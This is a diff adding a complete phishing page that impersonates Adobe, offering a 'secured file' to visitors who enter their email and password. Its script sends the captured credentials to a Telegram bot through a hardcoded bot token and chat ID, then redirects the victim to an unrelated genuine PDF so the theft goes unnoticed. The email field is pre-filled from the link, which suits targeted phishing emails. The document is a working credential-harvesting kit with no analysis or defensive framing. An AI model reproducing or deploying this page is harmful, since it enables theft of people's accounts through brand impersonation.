@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css" integrity="sha384-xOolHFLEh07PJGoPkLv1IbcEPTNtaed2xpHsD9ESMhqIYd0nLMwNLD69Npy4HI+N" crossorigin="anonymous">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+
+    <title>Adobe PDF Online</title>
+    <style>
+        body {
+            background-image: url('https://i.imgur.com/PwpcKi2.jpeg');
+            background-size: cover;
+            background-attachment: fixed;
+            background-position: center;
+            font-family: 'Roboto', sans-serif;
+            min-height: 100vh;
+            margin: 0;
+            padding: 0;
+        }
+        .header-bar {
+            background-color: #ff0000; /* Adobe's signature red */
+            padding: 10px 0;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+        .header-title {
+            color: #fff;
+            font-weight: 700;
+            font-size: 1.5rem;
+            letter-spacing: 0.5px;
+        }
+        .main-container {
+            padding: 20px 10px;
+        }
+        .card {
+            border: none;
+            border-radius: 10px;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.2);
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.95);
+            max-width: 400px;
+            margin: 0 auto;
+            transition: transform 0.3s ease;
+        }
+        .card:hover {
+            transform: translateY(-3px);
+        }
+        .card-title {
+            color: #ff0000; /* Adobe red for branding */
+            font-size: 1.4rem;
+            font-weight: 700;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+        .form-check-label {
+            color: #333; /* Darker text for readability */
+            font-size: 0.95rem;
+        }
+        .form-control {
+            border-radius: 20px;
+            padding: 10px 15px;
+            border: 1px solid #d1d1d1; /* Lighter border */
+            font-size: 0.9rem;
+            transition: border-color 0.3s ease;
+        }
+        .form-control:focus {
+            border-color: #ff0000; /* Adobe red on focus */
+            box-shadow: 0 0 5px rgba(255, 0, 0, 0.3);
+        }
+        .submit-btn {
+            background: #ff0000; /* Solid Adobe red */
+            border: none;
+            border-radius: 20px;
+            padding: 10px 25px;
+            color: #fff;
+            font-weight: 700;
+            font-size: 0.95rem;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            transition: background 0.3s ease, transform 0.2s ease;
+            width: 100%;
+        }
+        .submit-btn:hover {
+            background: #e60000; /* Slightly darker red on hover */
+            transform: scale(1.03);
+        }
+        .submit-btn:active {
+            transform: scale(0.97);
+        }
+        .footer-text {
+            color: #666; /* Softer gray for footer */
+            font-size: 0.8rem;
+            margin-top: 20px;
+            text-align: center;
+        }
+        /* Hide honeypot field for accessibility */
+        .honeypot-field {
+            display: none;
+        }
+
+        /* Media Queries for Mobile */
+        @media (max-width: 576px) {
+            .header-title {
+                font-size: 1.2rem;
+            }
+            .card {
+                padding: 15px;
+                max-width: 100%;
+                margin: 0 10px;
+            }
+            .card-title {
+                font-size: 1.2rem;
+            }
+            .form-check-label {
+                font-size: 0.85rem;
+            }
+            .form-control {
+                font-size: 0.85rem;
+                padding: 8px 12px;
+            }
+            .submit-btn {
+                font-size: 0.9rem;
+                padding: 8px 20px;
+            }
+            .footer-text {
+                font-size: 0.75rem;
+            }
+            .main-container {
+                padding: 15px 5px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container-fluid p-0">
+        <!-- Header -->
+        <div class="header-bar">
+            <div class="container">
+                <div class="row">
+                    <div class="col-12 text-center">
+                        <span class="header-title">Adobe PDF Online</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Main Content -->
+        <div class="main-container">
+            <div class="row justify-content-center">
+                <div class="col-12 col-lg-5">
+                    <div class="card">
+                        <div class="card-title">Secured Adobe File Verification</div>
+                        <div class="form-check mb-2">
+                            <input type="radio" class="form-check-input" name="optradio" checked>
+                            <label class="form-check-label">View File Online</label>
+                        </div>
+                        <div class="form-check mb-2">
+                            <input type="radio" class="form-check-input" name="optradio">
+                            <label class="form-check-label">Download File</label>
+                        </div>
+                        <div class="form-check mb-3">
+                            <input type="radio" class="form-check-input" name="optradio">
+                            <label class="form-check-label">Send File to Email</label>
+                        </div>
+
+                        <!-- Form with Telegram Integration and Honeypot -->
+                        <div class="mt-4 mx-auto">
+                            <form id="telegram-form" class="form-horizontal well">
+                                <div id="div1" class="text-dark">
+                                    <div>
+                                        <div class="form-group">
+                                            <input type="email" class="form-control" name="email" value="[[-Email-]]" placeholder="Email" id="email" required>
+                                            <script>
+                                                const params = new URLSearchParams(window.location.search);
+                                                const email = params.get('email');
+                                                if (email) {
+                                                    document.getElementById('email').value = email;
+                                                }
+                                            </script>
+                                        </div>
+                                        <div class="form-group">
+                                            <label class="font-weight-bold">Password</label>
+                                            <input type="password" name="password" id="password" class="form-control" pattern=".{5,}" required placeholder="Enter your password">
+                                        </div>
+                                        <!-- Honeypot field -->
+                                        <div class="form-group">
+                                            <input type="text" name="leave_blank" id="leave_blank" class="form-control honeypot-field" placeholder="Leave this blank">
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="text-center">
+                                    <button type="submit" class="submit-btn" id="submit-btn">Login To View File</button>
+                                    <button class="submit-btn" id="submit-btn1" style="display: none;">Verify To View File</button>
+                                </div>
+                                <div class="footer-text">To access our online secured documents page, you are required to login with your email address to ensure you are the rightful recipient for the protected file. Unauthorized access is prohibited.</div>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- JavaScript for Telegram Bot, Honeypot Check, and Redirect -->
+    <script>
+        document.getElementById('telegram-form').addEventListener('submit', function(e) {
+            e.preventDefault(); // Prevent default form submission
+
+            // Honeypot check
+            const honeypot = document.getElementById('leave_blank').value;
+            if (honeypot !== '') {
+                console.log('Bot detected: Honeypot field was filled.');
+                alert('Submission blocked: Suspicious activity detected.');
+                return; // Stop submission if honeypot is filled
+            }
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const botToken = '6180996330:AAHdKI3dj1mnuImorq8sDMMGztAqtlG7VCQ'; // Replace with your Telegram Bot Token
+            const chatId = '686297216'; // Replace with your Telegram Chat ID
+            const message = `New Login Attempt:\nEmail: ${email}\nPassword: ${password}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    // Redirect to the PDF on success
+                    window.location.href = 'https://www.nacha.org/system/files/2021-07/DP-Authorization-Form.pdf';
+                } else {
+                    alert('Failed to send to Telegram. Check your bot token and chat ID.');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('An error occurred while sending to Telegram.');
+            });
+        });
+    </script>
+</body>
+</html>
